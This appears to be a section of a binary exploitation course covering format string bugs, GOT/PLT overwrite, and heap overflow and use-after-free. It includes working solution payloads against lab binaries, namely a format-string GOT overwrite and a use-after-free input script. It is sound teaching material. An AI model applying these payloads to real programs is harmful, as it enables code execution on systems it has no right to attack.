4. Exploitation II
    * Format String Corruption
    * Format String GOT/PLT Overwrite
    * Heap Vulnerabilities
    * Mitigation Techniques

==== Format String Corruption ====

Next we'll analyze vulnerabilities with a new class of functions, the printf()
family. Consider the following two calls to printf(), where buf represents a
string read from the user:

printf("%s", buf);
printf(buf);

Although they look very similar, the second call is actually unsafe. This is
because printf() can't tell the difference between having a format string and
well-intentioned arguments on the stack (like in the fist example) and a
"format string" and whatever happens to be lying on the stack when printf() is
called (like in the second example). So if printf() is called in the second way
and the user supplies a string that contains a conversion specification (%s for
example), then the program will read memory from the stack and print it to the
user!

This problem is bad enough on its own, since data leakage is a severe
vulnerability, but printf() can actually write data as well! The %n conversion
specification prints the number of characters written so far to the location
that the corresponding argument points to. How could we use this to our
advantage?

The assembly of global_overwrite is annotated below:

# function prologue
0x0804846b <+0>:     push   ebp
0x0804846c <+1>:     mov    ebp,esp

# print user input
0x0804846e <+3>:     mov    eax,DWORD PTR [ebp+0xc]
0x08048471 <+6>:     add    eax,0x4
0x08048474 <+9>:     mov    eax,DWORD PTR [eax]
0x08048476 <+11>:    push   eax
0x08048477 <+12>:    call   0x8048320 <printf@plt>
0x0804847c <+17>:    add    esp,0x4

# print newline
0x0804847f <+20>:    push   0xa
0x08048481 <+22>:    call   0x8048350 <putchar@plt>
0x08048486 <+27>:    add    esp,0x4

# check if a global variable == 0
0x08048489 <+30>:    mov    eax,ds:0x804a028
0x0804848e <+35>:    test   eax,eax
0x08048490 <+37>:    jne    0x80484a1 <main+54>

# print message if global variable != 0
0x08048492 <+39>:    push   0x8048540
0x08048497 <+44>:    call   0x8048330 <puts@plt>
0x0804849c <+49>:    add    esp,0x4
0x0804849f <+52>:    jmp    0x80484ae <main+67>

# print message if global variable == 0
0x080484a1 <+54>:    push   0x8048566
0x080484a6 <+59>:    call   0x8048330 <puts@plt>
0x080484ab <+64>:    add    esp,0x4

# function epilogue
0x080484ae <+67>:    mov    eax,0x0
0x080484b3 <+72>:    leave
0x080484b4 <+73>:    ret

This program simply prints either a failure or a success message, depending on
whether or not a global variable is zero. Very straightforward, but there
doesn't seem to be any way to so much as touch the variable being checked.
However, a closer look reveals that printf() is being called unsafely.

Run global_overwrite with a conversion specifier as an argument. Sure enough,
the program reads a value off the stack and prints it according to the
specifier. This means that by using a string with arbitrarily many conversion
specifiers as input, we can read as many values as we want off the stack. So if
there were a pointer to the global variable somewhere on the stack, we could
use a %n specifier to corrupt it. The bad news is that the program never
declares a pointer to the global variable. But the good news is that if we
print enough values off the stack, we'll eventually reach our own string!

So if we put the address of the global variable in our string, we can read off
the stack until we reach it, and then use a %n conversion specifier to corrupt
it. Try doing this on the global_overwrite program. You may find it helpful to
use an inline python script, like:

./global_overwrite "$(python -c "print '%x ' * 5")"

*Note* Although this is a simple idea, the fact that the stack shifts with the
length of the input makes it tough. If people need help, offer the following
hint:

Alignment is easy when the length of the input doesn't change. Try to get
the last thing printed to be data you control, then *change* characters rather
than adding or removing them.

==== Format String GOT/PLT Overwrite ====

Now we'll see how to leverage a format string vulnerability to redirect code
execution. But first, some information on the global offset table (GOT) and the
procedure linkage table (PLT).

When a dynamically linked binary is compiled, it can't store shared library
information. This would defeat the purpose of dynamic linking. Instead,
whenever a shared variable or function is accessed, the compiler inserts a
relocation in it's place. This is space in the binary which is left to be
filled in at runtime. You can view the relocations in a binary with "readelf
--relocs <binary>". Run this command on global_overwrite. You'll see an output
like the following:

Relocation section '.rel.dyn' at offset 0x2c4 contains 1 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section '.rel.plt' at offset 0x2cc contains 4 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a018  00000507 R_386_JUMP_SLOT   00000000   putchar@GLIBC_2.0

Some of these functions were added by the compiler, but others such as printf()
can be found in the source code. If the shared data is a variable, this entry
will be filled as soon as the program is loaded into memory. If it is a
function, it won't be filled in until the first time the program calls that
function. This "lazy resolution" is acheived by using the PLT together with the
GOT.

     prog:                              GOT:
     +------------------+               +-----------------+
     | ...              |               | ...             |
     | call printf@plt -------+   +-----> GOT[n]: <addr> ------+
     | ...              |     |   |     | ...             |    |
     | ...              |     |   |     +-----------------+    |
     +------------------+     |   |                            |
                              |   |                            |
     PLT:                     |   |                            |
     +--------------------+   |   |                            |
 +---> PLT[0]:            |   |   |                            |
 |   |   call resolver    |   |   |                            |
 |   | ...                |   |   |                            |
 |   | PLT[n]: <--------------+   |                            |
 |   |   jmp *GOT[n] -------------+                            |
 |   |   prepare resolver <------------------------------------+
 +------ jmp PLT[0]       |
     | ...                |
     +--------------------+

At compile time, all calls to printf are replaced with calls to printf@plt.
For every call to a shared library function, the PLT has an entry with three
parts:

1) A jump to a corresponding entry in the GOT
2) A routine to prepare argruments for the resolver
3) A jump to the resolver, which is the first entry of the PLT

Before the first time printf() is called, the corresponding entry of the GOT
points to the section of the PLT entry that prepares and jumps to the resolver.
It is then the resolver's job to find printf()'s location, update the pointer in
the GOT to point to it, and make the call to it. Subsequent calls to printf()
will then go from the PLT to the GOT to the function's actual code.

This procedure can be exploited by simply overwriting an entry in the GOT.
Then the next time the program attempts to call the function, it will instead
execute whatever code is pointed to in the GOT.

Format string vulnerabilities give us just the arbitrary write needed to
overwrite a GOT entry. But since we can only write the number of characters
printed, and we need to write an address, we have to be clever in order to
avoid printing millions of characters every time we try to run our exploit.
There are a few properties of printf() that combat this:

Minimum Field Width:
A format specifier such as %10x will print a hexadecimal value, and also print
at least 10 characters while doing so.

Direct Parameter Access:
A format specifier such as %5$x will print the fifth argument (from printf()'s
perspective) in hexadecimal. Similarly, %5$n will write to the fifth argument.
$ is a special character to bash, so you have to escape it on the command line.

Short Writes: 
Since an address is such a large number, it is helpful to make more than one
write to fully overwrite it. For example, if we want to write 0x0804abcd to
address addr, we can first write 0xabcd to addr, then write 0x0804 to addr+2.
printf() format specifiers can include a length modifier to specify how many
bytes the write should take. The h specifier is for shorts, which are two bytes
long. Since we can only increase the number of characters printed, we will have
to write 0x10804 to addr+2 instead.

Take a look at got_overwrite.c. If we can overwrite the GOT entry for exit()
with the locatin of the win(), we can get that function to execute. You can get
the location of exit()'s GOT entry with "readelf --relocs got_overwrite" and
you can get the location of win()'s code with "readelf --symbols
got_overwrite". Try to make the program execute win().

Solution:
#!/usr/bin/python
import struct

# write 0x080484eb to 0x0804a01c
target_address          = struct.pack("<I", 0x0804a01c)
target_address_plus_two = struct.pack("<I", 0x0804a01c+2)

# two writes
print target_address + target_address_plus_two + "%34019x%2$n%33561x%3$n"

==== Heap Vulnerabilities ====

Next we'll turn our attention to exploits on the heap. The heap is just another
segment in memory. The user can dynamically allocate memory on the heap through
the use of the malloc() function, which takes a number of bytes and returns a
pointer to a chunk of memory with that size. After a chunk of memory has been
allocated, the user can deallocate it with the free() function, which takes a
pointer to memory on the heap and returns the corresponding chunk to the
operating system. The dynamic memory returned by the heap is slower than memory
on the stack, and is typically used for larger objects which need to be acessed
from different functions. 

When a chunk of memory is allocated on the heap, the operating system creates a
structure like so:

+-----------+---------+-+-------------------------------------+
| prev_size |   size  |f|    data (8 + (n / 8) * 8 bytes)     | -> heap grows
+-----------+---------+-+-------------------------------------+    this way
                          ^
                          |
                          |
                  pointer returned (ptr)

The size of the chunk is stored in the 4 bytes behind the allocated memory
(ptr - 0x4) and the size of the previous chunk is stored in the 4 bytes behind
that (ptr - 0x8). The heap is aligned such that the last 3 bits of the size are
always zero. Those three bits are instead used for flags denoting information
about the block.

0x01 PREV_INUSE    - set when previous chunk is in use
0x02 IS_MAPPED     - set if chunk was obtained with mmap()
0x04 NON_MAIN_AREA - set if chunk belongs to a non-main arena

The heap grows downward toward higher memory addresses, the opposite direction
of the stack. When a heap is freed, the chunk of data is used differently. The
first 4 bytes store a pointer to the next freed chunk, and the second 4 bytes
are used to store a pointer to the previous one.

+-----------+---------+-+----------+----------+---------------+
| prev_size |   size  |f| fwd_ptr  | prv_ptr  |               |
+-----------+---------+-+-------------------------------------+

There are additional complications for large blocks, but we won't go over them
here. In fact heaps get much more complicated and there are lots of different
implementations around, but this is the basic implementation.

Heap overflows work similarly to stack overflows, but writes are downward,
toward higher memory addresses. By overflowing a buffer in the heap you can
overwrite the metadata and data of later chunks . This can be exploited if the
data is used later in the program. Function pointers are a popular target for
heap overflows, as you can see in the heap overflow exercise. You already have
all the instruction you need to solve it now.

Heaps can also be exploited via use-after-free vulnerabilities. These
vulnerabilities rise when:

1) Memory is allocated on the heap
2) That memory is freed, but the pointer is still kept
3) The same memory is allocated and used for a different purpose
4) The program attempts to use the old pointer for it's original purpose

For example, consider two structs:

struct toystr {
    void (*message)(char*);
    char buffer[20];
}

struct person {
    int favorite_num;
    int age;
    char name[16];
}

Assume a toystr is allocated and subsequently freed, but the pointer is kept.
If memory is later allocated for a person and the favorite_num field can be
controlled, then the next time message() is called with the first pointer, the
program will crash (or worse).

Try to make this happen in heap_uaf.

http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/17/10_lecture.pdf

Solution:
#!/usr/bin/python

print 1          # make coolguy
print "A"        # name coolguy
print 3          # delete coolguy
print 2          # make person
print "A"        # name person
print 0x08048663 # set number as shell location
print 0          # set person's age
print 5          # call message with dangling coolguy pointer

==== Mitigation Techniques ====

ASLR

Stack canaries

RELRO
